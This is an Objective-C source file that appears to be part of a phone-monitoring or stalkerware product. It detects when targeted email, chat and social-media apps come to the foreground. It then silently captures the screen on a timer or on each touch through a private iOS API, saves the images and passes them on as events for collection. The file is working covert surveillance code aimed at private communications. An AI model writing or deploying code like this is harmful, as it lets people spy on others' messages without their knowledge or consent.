//
//  MobileAppScreenShot.m
//  AppScreenShotManager-iOS
//
//  Created by Makara Khloth on 12/30/16.
//  Copyright © 2016 ophat. All rights reserved.
//

#import "MobileAppScreenShot.h"
#import "AppStateNotifier.h"
#import "AppState.h"
#import "ScreenTouchNotifier.h"

#import "AppScreenRule.h"
#import "FxAppScreenShotEvent.h"
#import "DateTimeFormat.h"

extern UIImage *_UICreateScreenUIImageWithRotation(BOOL rotate);

@implementation MobileAppScreenShot

@synthesize mSavePath, mThread;
@synthesize mCurrentActiveApp, mCurrentRule, mCurrentTimer;
@synthesize mDelegate, mSelector;

- (instancetype) init {
    self = [super init];
    if (self) {
        mRules = [[NSMutableArray alloc] initWithCapacity:5];
        mAppStateNotifier = [[AppStateNotifier alloc] init];
        mAppStateNotifier.mDelegate = self;
        mAppStateNotifier.mSelector = @selector(applicationStateChanged:);
        mScreenTouchNotifier = [[ScreenTouchNotifier alloc] init];
        mScreenTouchNotifier.mDelegate = self;
        mScreenTouchNotifier.mSelector = @selector(userDidTouchScreen);
    }
    return self;
}

- (void) startCapture {
    [mAppStateNotifier startNotify];
    [mScreenTouchNotifier startNotify];
}

- (void) stopCapture {
    [mAppStateNotifier stopNotify];
    [mScreenTouchNotifier stopNotify];
}

- (void) addRule:(AppScreenRule *) aRule {
    [mRules addObject:aRule];
}

- (void) clearRules {
    [mRules removeAllObjects];
}

- (void) applicationStateChanged: (AppState *) aAppState {
    DLog(@"aAppState : %@", aAppState);
    if (aAppState.mState == kAppStateActivate) {
        // Check rule
        AppScreenRule *rule = [self checkRule:aAppState];
        if (rule) {
            self.mCurrentRule = rule;
            self.mCurrentActiveApp = aAppState;
            if (rule.mFrequency > 0) {
                self.mCurrentTimer = [NSTimer scheduledTimerWithTimeInterval:rule.mFrequency target:self selector:@selector(takeScreenshot:) userInfo:nil repeats:YES];
                [self.mCurrentTimer fire];
            }
        }
    } else {
        if ([self.mCurrentActiveApp.mBundleID isEqualToString:aAppState.mBundleID]) {
            // Stop timer
            [self.mCurrentTimer invalidate];
            self.mCurrentTimer = nil;
            
            // Clear rule and application
            self.mCurrentRule = nil;
            self.mCurrentActiveApp = nil;
        }
    }
}

- (void) userDidTouchScreen {
    // Check rule
    if (self.mCurrentRule) {
        if (self.mCurrentRule.mKey != kKeyPress_None ||
            self.mCurrentRule.mMouse != kMouseCick_None) { // Any key, any mouse click (user tab)
            [self takeScreenshot:nil];
        }
    }
}

- (AppScreenRule *) checkRule: (AppState *) aAppState {
    for (AppScreenRule *rule in mRules) {
        if ([rule.mApplicationID isEqualToString:aAppState.mBundleID]) {
            return rule;
        }
    }
    return nil;
}

- (void) takeScreenshot: (NSTimer *) aTimer {
    FxAppScreenShotEvent *assEvent = [[[FxAppScreenShotEvent alloc] init] autorelease];
    assEvent.dateTime = [DateTimeFormat phoenixDateTime];
    assEvent.mUserLogonName = @"mobile";
    assEvent.mApplicationID = self.mCurrentActiveApp.mBundleID;
    assEvent.mApplicationName = self.mCurrentActiveApp.mDisplayName;
    assEvent.mTitle = self.mCurrentActiveApp.mDisplayName;
    
    // App type
    if (self.mCurrentRule.mAppType == kNon_Browser) {
        assEvent.mApplication_Catagory = kAppScreenShotNon_Browser;
    } else {
        assEvent.mApplication_Catagory = kAppScreenShotBrowser;
    }
    
    // Screenshot category
    if (self.mCurrentRule.mScreenshotType == kScreenshotTypeWebmail) {
        assEvent.mScreenshot_Category = kAppScreenShotWebMail;
    } else if (self.mCurrentRule.mScreenshotType == kScreenshotTypeMailApp) {
        assEvent.mScreenshot_Category = kAppScreenShotMailApp;
    } else if (self.mCurrentRule.mScreenshotType == kScreenshotTypeWebChat) {
        assEvent.mScreenshot_Category = kAppScreenShotWebChat;
    } else if (self.mCurrentRule.mScreenshotType == kScreenshotTypeChatApp) {
        assEvent.mScreenshot_Category = kAppScreenShotChatApp;
    } else if (self.mCurrentRule.mScreenshotType == kScreenshotTypeSocialMedia) {
        assEvent.mScreenshot_Category = kAppScreenShotSocialMedia;
    }
    
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        UIImage *screenshot = _UICreateScreenUIImageWithRotation(TRUE);
        NSString *fileName = [NSString stringWithFormat:@"%@-%@.png", [[NSUUID UUID] UUIDString], [NSDate date]];
        NSString *filePath = [self.mSavePath stringByAppendingPathComponent:fileName];
        if ([UIImagePNGRepresentation(screenshot) writeToFile:filePath atomically:YES]) {
            assEvent.mScreenshotFilePath = filePath;
            if ([self.mDelegate respondsToSelector:self.mSelector]) {
                [self.mDelegate performSelector:self.mSelector onThread:self.mThread withObject:assEvent waitUntilDone:NO];
            }
        }
    });
}

- (void) dealloc {
    [mSavePath release];
    [mRules release];
    [mCurrentActiveApp release];
    [mCurrentRule release];
    [mCurrentTimer release];
    [mAppStateNotifier release];
    [mScreenTouchNotifier release];
    [super dealloc];
}

@end
